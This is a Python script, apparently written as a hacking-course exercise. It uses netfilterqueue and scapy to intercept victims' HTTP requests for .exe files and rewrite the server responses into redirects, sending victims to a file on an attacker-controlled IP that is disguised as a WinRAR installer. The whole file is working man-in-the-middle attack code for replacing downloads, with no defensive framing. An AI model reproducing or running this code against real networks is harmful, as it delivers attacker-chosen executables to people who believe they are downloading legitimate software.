#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

#  import optparse


# def get_arguments():
#     parser = optparse.OptionParser()
#     parser.add_option("-w", "--website", dest="website", help="Website to spoof")
#     parser.add_option("-i", "--ip", dest="ip", help="IP address of spoofing machine")
#     (options, arguments) = parser.parse_args()
#     if not options.website:
#         parser.error("[-] Please specify a Website, use --help for more info.")
#     elif not options.ip:
#         parser.error("[-] Please specify an IP Address, use --help for more info.")
#     return options


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load  # url to redirect the client to
    # delete these when you change the packet (scapy will automatically recalculate them)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):  # packet sniffed in the queue
    # opts = get_arguments()
    # website = opts.website
    # spoofing_ip = opts.ip
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # RR for response (in scapy data with http is in Raw layer)
        if scapy_packet[scapy.TCP].dport == 80:  # if the packet is a HTTP request
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # add the ack number to the list
        elif scapy_packet[scapy.TCP].sport == 80:  # if the packet is an HTTP response
            if scapy_packet[scapy.TCP].seq in ack_list:  # if the packet is an HTTP response
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # remove the ack number from the list
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                         "https://192.168.150.143/winrar-x64-621es.exe\n\n")

                packet.set_payload(str(modified_packet))
    packet.accept()  # forward the packet to the target


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
